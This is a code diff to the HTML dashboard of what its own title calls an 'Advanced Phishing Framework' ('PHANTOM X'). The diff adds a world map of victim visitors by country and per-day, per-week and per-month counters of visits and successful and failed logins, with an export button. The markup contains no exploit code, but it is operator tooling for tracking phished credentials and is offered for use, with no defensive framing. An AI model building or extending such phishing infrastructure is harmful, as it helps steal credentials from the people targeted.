@@ -6,7 +6,11 @@
     <title>PHANTOM X | Advanced Phishing Framework</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="/static/css/dashboard.css">
-    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAe1BMVEUAAAAjJjojJjojJjojJjojJjojJjoAzXQjJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQjJjojJjojJjojJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQjJjr///8ZNt+AAAAAJnRSTlMAIGCAv9+fQO9QML+PUIA/cFBgMO+vUL9AYI9wn0Cgz8+Pz1CPbzgaPcYAAAABYktHRCctD6gjAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH5gIVCjkMmI+K8QAAAONJREFUOMuVk9d2wyAMRRsM7tkkTfc27f//YWV7pTzl6j7oCIyuBAJKSilTOdlAGTciKF/rDpSGIdRJqMMowc14WKrj6DiKBGhWpQa6NZHvhcYG2AnoYeBMgP+ByXswB2wLcEKAUwLYBuARwCMBTgWwDYDvAfwKEHRvHtEfICJgfALjtDaPOPoCMt8LHZfgWIH+BiAtwekODJYQEtIvYF3mdhHAawDGFaBryJpNLpvzpRXKjdyftgY1qrzt/lDL99xwXfwB65rXS16i1sJr4y3v1gNovxTd4PxUnIZrQR6M8wc8wlA9mUaXDwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMi0wMi0yMVQxMDo1Nzo0OCswMDowMEWc9RUAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjItMDItMjFUMTA6NTc6NDgrMDA6MDA0wU2pAAAAAElFTkSuQmCC">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jvectormap/2.0.5/jquery-jvectormap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jvectormap/2.0.5/jquery-jvectormap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jvectormap/2.0.5/jquery-jvectormap-world-mill.min.js"></script>
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAe1BMVEUAAAAjJjojJjojJjojJjojJjojJjoAzXQjJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQjJjojJjojJjojJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQjJjr///8ZNt+AAAAAJnRSTlMAIGCAv9+fQO9QML+PUIA/cFBgMO+vUL9AYI9wn0Cgz8+Pz1CPbzgaPcYAAAABYktHRCctD6gjAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH5gIVCjkMmI+K8QAAAONJREFUOMuVk9d2wyAMRRsM7tkkTfc27f//YWV7pTzl6j7oCIyuBAJKSilTOdlAGTciKF/rDpSGIdRJqMMowc14WKrj6DiKBGhWpQa6NZHvhcYG2AnoYeBMgP+ByXswB2wLcEKAUwLYBuARwCMBTgWwDYDvAfwKEHRvHtEfICJgfALjtDaPOPoCMt8LHZfgWIH+BiAtwekODJYQEtIvYF3mdhHAawDGFaBryJpNLpvzpRXKjdyftgY1qrzt/lDL99xwXfwB65rXS16i1sJr4y3v1gNovxTd4PxUnIZrQR6M8wc8wlA9mUaXDwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMi0wMi0yMVQxMDo1Nzo0OCswMDowMEWc9RUAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjItMDItMjFUMTA6NTc6NDgrMDA6MDA0wU2pAAAAAElFTkSuQmCC">
 </head>
 <body>
     <canvas id="matrix-bg" class="matrix-bg"></canvas>
@@ -245,6 +249,84 @@
                                                 </tr>
                                             </tbody>
                                         </table>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- إضافة قسم خريطة الزوار -->
+                    <div class="dashboard-row">
+                        <div class="dashboard-col">
+                            <div class="card map-card">
+                                <div class="card-header">
+                                    <h3>Visitors By Country</h3>
+                                </div>
+                                <div class="card-body">
+                                    <div id="world-map" class="world-map"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-row">
+                        <div class="dashboard-col">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h3>Statistics by Period</h3>
+                                    <div class="stats-actions">
+                                        <button id="export-stats" class="btn-sm btn-primary">
+                                            <i class="fas fa-download"></i> Export Statistics
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="card-body">
+                                    <div class="stats-period-grid">
+                                        <div class="stats-period-card">
+                                            <h4>Today</h4>
+                                            <div class="stats-period-item">
+                                                <span>Visits:</span>
+                                                <strong id="today-visits">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Successful Logins:</span>
+                                                <strong id="today-success">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Failed Logins:</span>
+                                                <strong id="today-failed">0</strong>
+                                            </div>
+                                        </div>
+                                        <div class="stats-period-card">
+                                            <h4>This Week</h4>
+                                            <div class="stats-period-item">
+                                                <span>Visits:</span>
+                                                <strong id="week-visits">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Successful Logins:</span>
+                                                <strong id="week-success">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Failed Logins:</span>
+                                                <strong id="week-failed">0</strong>
+                                            </div>
+                                        </div>
+                                        <div class="stats-period-card">
+                                            <h4>This Month</h4>
+                                            <div class="stats-period-item">
+                                                <span>Visits:</span>
+                                                <strong id="month-visits">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Successful Logins:</span>
+                                                <strong id="month-success">0</strong>
+                                            </div>
+                                            <div class="stats-period-item">
+                                                <span>Failed Logins:</span>
+                                                <strong id="month-failed">0</strong>
+                                            </div>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
